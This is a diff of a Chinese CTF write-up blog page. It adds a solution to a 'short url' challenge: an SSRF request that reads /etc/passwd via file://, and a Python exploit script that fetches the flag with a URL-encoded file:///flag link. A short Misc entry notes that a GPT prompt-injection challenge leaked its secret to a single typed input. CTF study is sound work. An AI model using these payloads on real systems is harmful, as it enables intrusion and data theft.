-  setImmediate<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> setImmediate<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  clearTimeout<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> clearTimeout<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  clearInterval<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> clearInterval<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  clearImmediate<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> clearImmediate<span class="token punctuation">]</span><span class="token punctuation">,</span>
-  process<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
-    argv<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
-    title<span class="token operator">:</span> 'node'<span class="token punctuation">,</span>
-    version<span class="token operator">:</span> 'v20.<span class="token number">11.0</span>'<span class="token punctuation">,</span>
-    versions<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
-      node<span class="token operator">:</span> '<span class="token number">20.11</span>.<span class="token number">0</span>'<span class="token punctuation">,</span>
-      acorn<span class="token operator">:</span> '<span class="token number">8.11</span>.<span class="token number">2</span>'<span class="token punctuation">,</span>
-      ada<span class="token operator">:</span> '<span class="token number">2.7</span>.<span class="token number">4</span>'<span class="token punctuation">,</span>
-      ares<span class="token operator">:</span> '<span class="token number">1.20</span>.<span class="token number">1</span>'<span class="token punctuation">,</span>
-      base64<span class="token operator">:</span> '<span class="token number">0.5</span>.<span class="token number">1</span>'<span class="token punctuation">,</span>
-      brotli<span class="token operator">:</span> '<span class="token number">1.0</span>.<span class="token number">9</span>'<span class="token punctuation">,</span>
-      cjs_module_lexer<span class="token operator">:</span> '<span class="token number">1.2</span>.<span class="token number">2</span>'<span class="token punctuation">,</span>
-      cldr<span class="token operator">:</span> '<span class="token number">43.1</span>'<span class="token punctuation">,</span>
-      icu<span class="token operator">:</span> '<span class="token number">73.2</span>'<span class="token punctuation">,</span>
-      llhttp<span class="token operator">:</span> '<span class="token number">8.1</span>.<span class="token number">1</span>'<span class="token punctuation">,</span>
-      modules<span class="token operator">:</span> '<span class="token number">115</span>'<span class="token punctuation">,</span>
-      napi<span class="token operator">:</span> '<span class="token number">9</span>'<span class="token punctuation">,</span>
-      nghttp2<span class="token operator">:</span> '<span class="token number">1.58</span>.<span class="token number">0</span>'<span class="token punctuation">,</span>
-      nghttp3<span class="token operator">:</span> '<span class="token number">0.7</span>.<span class="token number">0</span>'<span class="token punctuation">,</span>
-      ngtcp2<span class="token operator">:</span> '<span class="token number">0.8</span>.<span class="token number">1</span>'<span class="token punctuation">,</span>
-      openssl<span class="token operator">:</span> '<span class="token number">3.0</span>.<span class="token number">12</span>+quic'<span class="token punctuation">,</span>
-      simdutf<span class="token operator">:</span> '<span class="token number">4.0</span>.<span class="token number">4</span>'<span class="token punctuation">,</span>
-      tz<span class="token operator">:</span> '2023c'<span class="token punctuation">,</span>
-      undici<span class="token operator">:</span> '<span class="token number">5.27</span>.<span class="token number">2</span>'<span class="token punctuation">,</span>
-      unicode<span class="token operator">:</span> '<span class="token number">15.0</span>'<span class="token punctuation">,</span>
-      uv<span class="token operator">:</span> '<span class="token number">1.46</span>.<span class="token number">0</span>'<span class="token punctuation">,</span>
-      uvwasi<span class="token operator">:</span> '<span class="token number">0.0</span>.<span class="token number">19</span>'<span class="token punctuation">,</span>
-      v8<span class="token operator">:</span> '<span class="token number">11.3</span>.<span class="token number">244.8</span>-node.<span class="token number">17</span>'<span class="token punctuation">,</span>
-      zlib<span class="token operator">:</span> '<span class="token number">1.2</span>.<span class="token number">13.1</span>-motley-5daffc7'
-    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
-    arch<span class="token operator">:</span> 'arm64'<span class="token punctuation">,</span>
-    platform<span class="token operator">:</span> 'linux'<span class="token punctuation">,</span>
-    env<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
-    pid<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
-    features<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
-      inspector<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
-      debug<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
-      uv<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
-      ipv6<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
-      tls_alpn<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
-      tls_sni<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
-      tls_ocsp<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
-      tls<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
-      cached_builtins<span class="token operator">:</span> <span class="token punctuation">[</span>Getter<span class="token punctuation">]</span>
-    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
-    nextTick<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> nextTick<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    hrtime<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> hrtime<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    uptime<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> uptime<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    cwd<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> cwd<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    addListener<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> addListener<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    on<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> addListener<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    once<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> once<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    listeners<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> listeners<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    removeListener<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> removeListener<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    umask<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> umask<span class="token punctuation">]</span>
-  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
-  console<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
-    debug<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> debug<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    log<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> log<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    info<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> info<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    warn<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> warn<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    error<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> error<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    dir<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> dir<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    time<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> time<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    timeEnd<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> timeEnd<span class="token punctuation">]</span><span class="token punctuation">,</span>
-    trace<span class="token operator">:</span> <span class="token punctuation">[</span>Function<span class="token operator">:</span> trace<span class="token punctuation">]</span>
-  <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>当前目录</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>回显：<code>/</code></p>
-<hr>
-<h2 id="short-url-Unsolved"><a href="#short-url-Unsolved" class="headerlink" title="short url (Unsolved)"></a>short url (Unsolved)</h2><p>MyIntercepter.class</p>
+<p>MyIntercepter.class</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span>
 <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyIntercepter</span> <span class="token keyword">implements</span> <span class="token class-name">HandlerInterceptor</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token class-name">MyIntercepter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
@@ -592,7 +500,30 @@ q<span class="token operator">=</span><span class="token builtin">int</span><spa
    <span class="token keyword">return</span> <span class="token operator">!</span>ip<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"not allowed"</span> <span class="token operator">:</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>&#x2F;private路由要求本地请求，首先可以确定要ssrf</p>
+<p>&#x2F;private路由要求本地请求，可以确定要ssrf</p>
+<p>用file协议读取文件</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:8080/private;?url=file://www.example.com////etc/passwd</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>往协议头里面塞，转到 private 的时候会自动过一层 url 解码，变成 <code>Fetch(&quot;file:///etc/passwd?://www.example.com/&quot;);</code></p>
+<p>exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> re
+
+url <span class="token operator">=</span> <span class="token string">"http://localhost:85/"</span>
+
+link <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080/private;?url=%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%3f://www.example.com/"</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"share"</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"link"</span><span class="token punctuation">:</span>link<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+text <span class="token operator">=</span> r<span class="token punctuation">.</span>text
+<span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'redirect=([^&amp;]+)'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>
+redirect_value <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token keyword">else</span> <span class="token boolean">None</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>redirect_value<span class="token punctuation">)</span>
+
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"test;?redirect="</span><span class="token operator">+</span>redirect_value<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">,</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <hr>
 <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>GPT提示词注入</p>
 <p>直接输tl就爆出来了</p>
